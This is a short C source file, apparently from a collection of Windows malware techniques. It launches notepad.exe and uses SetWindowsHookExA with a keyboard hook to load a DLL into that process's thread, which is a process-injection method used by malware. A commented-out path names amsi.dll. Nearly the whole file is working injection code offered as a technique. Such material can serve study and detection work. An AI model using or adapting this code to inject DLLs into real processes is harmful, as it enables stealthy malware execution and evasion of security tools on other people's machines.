#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>


int main()
{
	//LPCWSTR DllPath = L"C:\\Windows\\System32\\amsi.dll";
	LPCWSTR DllPath = L"C:\\Users\\hank_k_chen\\Desktop\\windows_malware_technique-master\\Dll_Template\\Debug\\Dll_Template.dll";

	// createprocess
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	HANDLE hProcess = pi.hProcess;
	DWORD dwProcessId = pi.dwProcessId;
	DWORD dwThreadId = pi.dwThreadId;

	WaitForSingleObject(pi.hProcess, 1000);

	HMODULE hModDll = LoadLibrary(DllPath);
	if (!hModDll) {
		printf("Error in getting module handle for %s\n", DllPath);
		printf("LastError : 0X%x\n", GetLastError());
		return false;
	}

	HOOKPROC procAddress = (HOOKPROC)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	if (!procAddress) {
		printf("Error in getting hook procedure address in %s\n", DllPath);
		printf("LastError : 0X%x\n", GetLastError());
		return false;
	}

	printf("Setting hook in thread with ID %d\n", dwThreadId);
	HHOOK hookHandle = SetWindowsHookExA(WH_KEYBOARD, procAddress, hModDll, dwThreadId);
	if (!hookHandle) {
		printf("Error in Setting Hook in thread\n");
		printf("LastError : 0X%x\n", GetLastError());
		return false;
	}
	else
	{
		printf("Hook Installed successfully via SetWindowsHookEx in process %d\n", dwProcessId);
		UnhookWindowsHookEx(hookHandle);
		return true;
	}


	return 0;
}

